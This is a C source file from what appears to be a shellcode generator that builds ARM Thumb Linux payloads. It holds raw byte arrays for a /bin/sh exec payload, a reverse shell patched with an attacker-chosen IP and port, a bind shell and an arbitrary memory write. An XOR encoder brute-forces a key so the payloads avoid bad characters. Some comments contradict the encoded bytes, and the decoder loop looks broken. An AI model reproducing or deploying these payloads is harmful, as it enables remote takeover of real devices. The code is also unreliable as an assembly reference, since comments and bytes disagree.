#include "shellforge.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>

/* ─────────────────────────────────────────────
   ARM Linux Synthesiser — Thumb mode
   ABI: r7=syscall_nr, r0-r3=args, svc #0
   ───────────────────────────────────────────── */

/* ── execve(/bin//sh) ARM Thumb — 20 bytes ───
 * mov r0,pc       ; r0 = pc (current+4 in Thumb)
 * adds r0,#18     ; r0 → "/bin//sh" string below
 * adds r4,r0,#0   ; save string ptr
 * subs r1,r1,r1   ; r1 = 0 (argv=NULL)
 * subs r2,r2,r2   ; r2 = 0 (envp=NULL)
 * movs r7,#11     ; execve
 * svc  #0
 * "/bin//sh\0\0"  (10 bytes with pad)
 */
static const uint8_t EXEC_ARM_THUMB[] = {
    0x78,0x46,           /* mov  r0,pc            */
    0x08,0x30,           /* adds r0,#8            */
    0x49,0x1a,           /* subs r1,r1,r1         */
    0x92,0x1a,           /* subs r2,r2,r2         */
    0x0b,0x27,           /* movs r7,#11           */
    0x00,0xdf,           /* svc  #0               */
    0x2f,0x62,0x69,0x6e, /* /bin                  */
    0x2f,0x2f,0x73,0x68, /* //sh                  */
    0x00,0x00            /* null + pad             */
};

/* ── Reverse shell ARM Thumb ─────────────────*/
#define ARM_RS_PORT_OFF  20
#define ARM_RS_IP_OFF    24

static const uint8_t REVSHELL_ARM_THUMB[] = {
    /* socket(2,1,0): r7=281=0xff+26 */
    0xff,0x27, 0x1a,0x37,
    0x02,0x20, 0x01,0x21, 0x92,0x1a,
    0x00,0xdf,
    0x06,0x1c,              /* r6=sockfd             */
    /* sockaddr inline, r1=pc+N, r2=16, connect */
    0x05,0xa1,              /* add r1,pc,#20 → sa    */
    0x10,0x22,
    0xff,0x27, 0x1c,0x37,   /* r7=283                */
    0x30,0x1c, 0x00,0xdf,
    /* sockaddr_in: {AF_INET, port, ip} */
    0x02,0x00,              /* AF_INET               */
    0x00,0x00,              /* port [+20]            */
    0x00,0x00,0x00,0x00,    /* ip   [+24]            */
    /* dup2(sockfd,2/1/0): r7=63 */
    0x3f,0x27,
    0x30,0x1c, 0x02,0x21, 0x00,0xdf,
    0x01,0x21, 0x00,0xdf,
    0x49,0x1a, 0x00,0xdf,
    /* execve */
    0x78,0x46, 0x08,0x30,
    0x49,0x1a, 0x92,0x1a,
    0x0b,0x27, 0x00,0xdf,
    0x2f,0x62,0x69,0x6e,
    0x2f,0x2f,0x73,0x68,
    0x00,0x00
};

/* ── Bind shell ARM Thumb ────────────────────*/
#define ARM_BS_PORT_OFF  18

static const uint8_t BINDSHELL_ARM_THUMB[] = {
    /* socket(2,1,0) */
    0xff,0x27, 0x1a,0x37,
    0x02,0x20, 0x01,0x21, 0x92,0x1a,
    0x00,0xdf, 0x06,0x1c,
    /* sockaddr */
    0x04,0xa1, 0x10,0x22,
    0x02,0x00,
    0x00,0x00,              /* port [+18]            */
    0x00,0x00,0x00,0x00,
    /* bind: r7=282 */
    0xff,0x27, 0x1b,0x37,
    0x30,0x1c, 0x00,0xdf,
    /* listen: r7=284 */
    0xff,0x27, 0x1d,0x37,
    0x30,0x1c, 0x01,0x21, 0x00,0xdf,
    /* accept: r7=285 */
    0xff,0x27, 0x1e,0x37,
    0x30,0x1c, 0x49,0x1a, 0x92,0x1a, 0x00,0xdf,
    0x06,0x1c,
    /* dup2 x3 */
    0x3f,0x27,
    0x30,0x1c, 0x02,0x21, 0x00,0xdf,
    0x01,0x21, 0x00,0xdf,
    0x49,0x1a, 0x00,0xdf,
    /* execve */
    0x78,0x46, 0x08,0x30,
    0x49,0x1a, 0x92,0x1a,
    0x0b,0x27, 0x00,0xdf,
    0x2f,0x62,0x69,0x6e,
    0x2f,0x2f,0x73,0x68,
    0x00,0x00
};

/* ── ARM Thumb XOR decoder stub — 22 bytes ───
 * Uses pc-relative addressing to find payload.
 * In Thumb, pc = current_insn_addr + 4.
 * Stub is 22 bytes, payload starts at byte 22.
 * From mov r0,pc at [0]: r0 = 0+4 = 4
 * adds r0,#18: r0 = 4+18 = 22 → payload start ✓
 *
 * LEN at byte offset 7 (movs r1,#LEN)
 * KEY at byte offset 9 (movs r2,#KEY)
 */
#define ARM_XOR_STUB_LEN  22
#define ARM_XOR_LEN_OFF    7
#define ARM_XOR_KEY_OFF    9

static const uint8_t ARM_XOR_STUB[ARM_XOR_STUB_LEN] = {
    0x78,0x46,   /* [0]  mov  r0,pc           */
    0x12,0x30,   /* [2]  adds r0,#18 →[22]    */
    0x04,0x1c,   /* [4]  adds r4,r0,#0 (save) */
    0x00,0x21,   /* [6]  movs r1,#LEN  [7]    */
    0x00,0x22,   /* [8]  movs r2,#KEY  [9]    */
    0x03,0x78,   /* [10] ldrb r3,[r0]          */
    0x13,0x40,   /* [12] eors r3,r2            */
    0x03,0x70,   /* [14] strb r3,[r0]          */
    0x01,0x30,   /* [16] adds r0,#1            */
    0xf9,0xd1,   /* [18] bne [10] (offset=-7→0xf9) */
    0x20,0x47,   /* [20] bx   r4               */
};

static void a_append(sf_result_t *r, const char *s) {
    size_t rem = sizeof(r->disasm) - strlen(r->disasm) - 1;
    strncat(r->disasm, s, rem);
}

static sf_status_t arm_encode_xor(sf_result_t *r, const sf_constraints_t *c) {
    if (r->payload_len > 255) return SF_ERR_ENCODE_FAIL;
    uint8_t orig[SF_MAX_PAYLOAD];
    size_t  olen = r->payload_len;
    memcpy(orig, r->payload, olen);

    for (int key=1; key<=0xff; key++) {
        uint8_t enc[SF_MAX_PAYLOAD]; int ok=1;
        for (size_t i=0;i<olen;i++) {
            enc[i]=orig[i]^(uint8_t)key;
            if (sf_is_bad_char(c,enc[i])){ok=0;break;}
        }
        if (!ok) continue;
        if (sf_is_bad_char(c,(uint8_t)key)) continue;

        uint8_t stub[ARM_XOR_STUB_LEN];
        memcpy(stub,ARM_XOR_STUB,ARM_XOR_STUB_LEN);
        stub[ARM_XOR_LEN_OFF]=(uint8_t)olen;
        stub[ARM_XOR_KEY_OFF]=(uint8_t)key;
        if (!sf_buffer_clean(c,stub,ARM_XOR_STUB_LEN)) continue;

        size_t flen=0;
        uint8_t full[SF_MAX_PAYLOAD];
        if (flen+ARM_XOR_STUB_LEN > SF_MAX_PAYLOAD) continue;
        memcpy(full+flen, stub, ARM_XOR_STUB_LEN); flen+=ARM_XOR_STUB_LEN;
        if (flen+olen > SF_MAX_PAYLOAD) continue;
        memcpy(full+flen, enc, olen); flen+=olen;

        memcpy(r->payload,full,flen); r->payload_len=flen;
        char note[128];
        snprintf(note,sizeof(note),"; ARM Thumb XOR key=0x%02x len=%zu\n",key,olen);
        char saved[sizeof(r->disasm)];
        strncpy(saved,r->disasm,sizeof(saved)-1); saved[sizeof(saved)-1]='\0';
        memset(r->disasm,0,sizeof(r->disasm));
        a_append(r,note); a_append(r,saved);
        return SF_OK;
    }
    return SF_ERR_ENCODE_FAIL;
}

sf_status_t sf_synth_arm_linux(const sf_constraints_t *c, sf_result_t *r) {
    switch (c->goal) {

        case GOAL_EXEC_SHELL:
            memcpy(r->payload,EXEC_ARM_THUMB,sizeof(EXEC_ARM_THUMB));
            r->payload_len=sizeof(EXEC_ARM_THUMB);
            a_append(r,"; ARM Thumb execve(/bin//sh)\nmov r0,pc; adds r0,#8\n"
                "subs r1,r1; subs r2,r2; movs r7,#11; svc #0\n");
            break;

        case GOAL_REVERSE_SHELL: {
            if (c->goal_args.argc<1) return SF_ERR_INVALID_ARG;
            char arg[SF_MAX_ARG_LEN];
            strncpy(arg,(const char*)c->goal_args.args[0],SF_MAX_ARG_LEN-1);
            arg[SF_MAX_ARG_LEN-1]='\0';
            char *colon=strrchr(arg,':');
            if (!colon) return SF_ERR_INVALID_ARG;
            *colon='\0';
            int pnum=atoi(colon+1);
            if (pnum<=0||pnum>65535) return SF_ERR_INVALID_ARG;
            struct in_addr addr;
            if (inet_pton(AF_INET,arg,&addr)!=1) return SF_ERR_INVALID_ARG;
            uint32_t ip=addr.s_addr;
            uint16_t port=htons((uint16_t)pnum);
            memcpy(r->payload,REVSHELL_ARM_THUMB,sizeof(REVSHELL_ARM_THUMB));
            r->payload[ARM_RS_PORT_OFF]  =port&0xff;
            r->payload[ARM_RS_PORT_OFF+1]=(port>>8)&0xff;
            memcpy(&r->payload[ARM_RS_IP_OFF],&ip,4);
            r->payload_len=sizeof(REVSHELL_ARM_THUMB);
            uint8_t *p=(uint8_t*)&ip;
            char d[128];
            snprintf(d,sizeof(d),"; ARM Thumb reverse shell → %u.%u.%u.%u:%u\n",
                p[0],p[1],p[2],p[3],ntohs(port));
            a_append(r,d);
            break;
        }

        case GOAL_BIND_SHELL: {
            if (c->goal_args.argc<1) return SF_ERR_INVALID_ARG;
            int pnum=atoi((const char*)c->goal_args.args[0]);
            if (pnum<=0||pnum>65535) return SF_ERR_INVALID_ARG;
            uint16_t port=htons((uint16_t)pnum);
            memcpy(r->payload,BINDSHELL_ARM_THUMB,sizeof(BINDSHELL_ARM_THUMB));
            r->payload[ARM_BS_PORT_OFF]  =port&0xff;
            r->payload[ARM_BS_PORT_OFF+1]=(port>>8)&0xff;
            r->payload_len=sizeof(BINDSHELL_ARM_THUMB);
            char d[64];
            snprintf(d,sizeof(d),"; ARM Thumb bind shell port %u\n",(uint16_t)pnum);
            a_append(r,d);
            break;
        }

        case GOAL_ARBITRARY_WRITE: {
            if (c->goal_args.argc<2) return SF_ERR_INVALID_ARG;
            uint32_t addr =(uint32_t)strtoul((const char*)c->goal_args.args[0],NULL,0);
            uint32_t value=(uint32_t)strtoul((const char*)c->goal_args.args[1],NULL,0);
            /* ldr r0,[pc,#8]; ldr r1,[pc,#8]; str r1,[r0]; bx lr; .word addr; .word value */
            uint8_t sc[16]; size_t pos=0;
            sc[pos++]=0x02; sc[pos++]=0x48; /* ldr r0,[pc,#8]  */
            sc[pos++]=0x02; sc[pos++]=0x49; /* ldr r1,[pc,#8]  */
            sc[pos++]=0x01; sc[pos++]=0x60; /* str r1,[r0]     */
            sc[pos++]=0x70; sc[pos++]=0x47; /* bx  lr          */
            memcpy(sc+pos,&addr,4);  pos+=4;
            memcpy(sc+pos,&value,4); pos+=4;
            memcpy(r->payload,sc,pos); r->payload_len=pos;
            char d[128];
            snprintf(d,sizeof(d),"; ARM Thumb arb write *0x%x=0x%x\n",addr,value);
            a_append(r,d);
            break;
        }

        default:
            snprintf(r->error_msg,sizeof(r->error_msg),"Goal not supported for ARM");
            return SF_ERR_UNSUPPORTED;
    }

    if (!sf_buffer_clean(c,r->payload,r->payload_len)) {
        sf_status_t es=arm_encode_xor(r,c);
        if (es!=SF_OK) return es;
        r->encoding_used=ENC_XOR;
    } else {
        r->encoding_used=ENC_NONE;
    }
    return SF_OK;
}
